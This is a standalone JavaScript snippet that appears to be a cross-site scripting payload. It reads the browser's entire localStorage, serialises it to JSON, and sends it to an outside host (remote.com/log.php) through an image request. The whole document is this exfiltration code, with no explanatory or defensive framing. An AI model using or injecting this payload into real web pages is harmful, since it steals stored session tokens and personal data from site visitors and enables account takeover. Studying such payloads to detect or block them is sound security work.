
if ('localStorage' in window && window['localStorage'] !== null) {
    new Image().src = 'http://remote.com/log.php?localStorage='+JSON.stringify(window['localStorage']);
} 


